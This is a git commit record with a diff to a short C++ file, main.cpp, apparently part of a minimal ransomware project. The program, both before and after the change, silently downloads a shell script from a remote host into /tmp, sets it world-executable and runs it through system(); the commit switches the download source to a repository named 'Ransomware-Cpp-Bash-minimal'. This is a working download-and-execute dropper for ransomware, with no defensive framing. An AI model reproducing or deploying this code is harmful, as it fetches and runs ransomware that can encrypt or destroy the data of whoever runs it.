3ea57f91a9ca9b7d31aa50ae467a712494503708
drigg3r <drigg3r@yandex.com>
2016-09-12 19:40:21 -0500

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -5,7 +5,7 @@ using namespace std;
 
 int main()
 {
-	string cmd = "cd /tmp && wget -O /tmp/wow2.sh http://ddl2.data.hu/get/0/9977056/wow2.sh > /dev/null 2>&1 && chmod 777 /tmp/wow2.sh && ./wow2.sh";
+	string cmd = "cd /tmp && wget -O /tmp/base.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/base.sh > /dev/null 2>&1 && chmod 777 /tmp/base.sh && ./base.sh";
 	system(cmd.c_str());
 	return 0;
 }
